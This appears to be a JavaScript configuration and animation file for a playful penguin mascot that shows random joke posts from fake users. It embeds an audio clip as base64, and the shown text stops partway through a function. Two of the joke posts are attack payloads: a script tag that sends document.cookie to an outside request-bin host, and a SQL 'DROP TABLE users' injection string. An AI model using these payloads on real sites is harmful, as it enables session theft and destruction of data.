/*
Configuration
*/

const CONFIG = {
    audio: {
        // convert mp3 via powershell (windoof): [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\sound.mp3"))
        // would have used the iconic noot noot sound, but sadly it's under copyright :(
        nootNootData: 'data:audio/mp3;base64,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vrdobnHnyyywK638TWpaPikS/m1vMWDTcFXYmlmzVrffE8WJbe7zz2rWFBl3vU1JYRVZ3IxAkktLALHA0W7ISi1zfl7QEFEV9WSl5i9SeqvD4OQ9WoQNjIyeaXQvbAWkrrJJPTlmo84ls/+WJXOGkcJWjjzyQUWRbcOI5WzPdHt8rZanYlaJ2yci1VpFH4aj5ynn+crWo0i/eWS7bT4SLhI0xE49ElaJ1pZSSUICVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVMQU1FMy4xMDBVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV//t0ZPsA9BJDU39h4AoAAA0g4AABD8EzP+wwzSgAADSAAAAEVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV//sUZOGP8AAAf4AAAAgAAA0gAAABAAABpAAAACAAADSAAAAEVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV',
        volume: 0.5
    },
    animation: {
        positions: ['5%', '12%', '20%', '28%', '36%', '44%', '52%', '60%', '68%', '76%'],
        positionExpiry: 2000, // ms - how long a position stays occupied
        soundDelay: 2500, // ms - when to play sound during animation
        totalDuration: 6000, // ms - total animation duration
        flyingPostDuration: 1000 // ms - post flying animation duration
    },
    timing: {
        initialPostDelay: 10000, // ms - delay before first random post
        minPostInterval: 15000, // ms - minimum time between random posts
        maxPostInterval: 20000 // ms - maximum time between random posts
    },
    post: {
        maxLength: 280,
        approximateWidth: 600, // px - approximate post width for animation
        verticalOffset: 50 // px - offset from pengu top for post spawn
    },
    users: [
        { avatar: '🐸', username: 'FroggyFrank0x539' },
        { avatar: '🐢', username: 'TubularTurtle0x2A' },
        { avatar: '🐍', username: 'SlickSnake25' },
        { avatar: '🦖', username: 'RadicalRex247' },
        { avatar: '🦕', username: 'DynamiteDino1337' },
        { avatar: '🐶', username: 'DoggyDan342' },
        { avatar: '🐱', username: 'CoolCat66' },
        { avatar: '🦋', username: 'ButterflyBetty42' },
        { avatar: '🐻', username: 'BodaciousBear12' }
    ],
    randomPosts: [
        "I love cookies!🍪 '<script>window.location.replace(\"https://requestbin.kanbanbox.com/ACB798?\" + document.cookie)</script>'",
        "Is there a seahorse emoji?🐎",
        "Are there any NFL teams that don't end in s?",
        "When will there be soja-döner again??😥",
        "Hey \"@'; DROP TABLE users;--\", how are you doing? 🗑️",
        "Attention, the floor is java! ☕",
        "Why do Java developers wear glasses? Because they don't C# 😎",
        "I'm not procrastinating, I'm just refactoring my time ⏰",
        "404: Motivation not found 😴",
        "Copy-paste from Stack Overflow without reading: 10% of the time, it works every time 📋",
        "There's no place like 127.0.0.1 🏠"
    ]
};


/*
Sounds
*/

const AudioModule = {
    playNootNoot() {
        try {
            const sound = new Audio(CONFIG.audio.nootNootData);
            sound.volume = CONFIG.audio.volume;
            sound.play().catch(error => {
                console.log("Audio playback failed:", error.message);
            });
        } catch (error) {
            console.log("Audio generation issue:", error.message);
        }
    }
};

/*
Pengu Position Management
*/


const state = {
    occupiedPositions: new Map()
};

const PositionManager = {
    cleanupExpiredPositions() {
        const now = Date.now();
        for (const [pos, timestamp] of state.occupiedPositions.entries()) {
            if (now - timestamp > CONFIG.animation.positionExpiry) {
                state.occupiedPositions.delete(pos);
            }
        }
    },

    getAvailablePositions() {
        return CONFIG.animation.positions.filter(
            pos => !state.occupiedPositions.has(pos)
        );
    },

    getRandomPosition() {
        this.cleanupExpiredPositions();
        
        const availablePositions = this.getAvailablePositions();
        const positions = availablePositions.length > 0 
            ? availablePositions 
            : CONFIG.animation.positions;
        
        const position = positions[Math.floor(Math.random() * positions.length)];
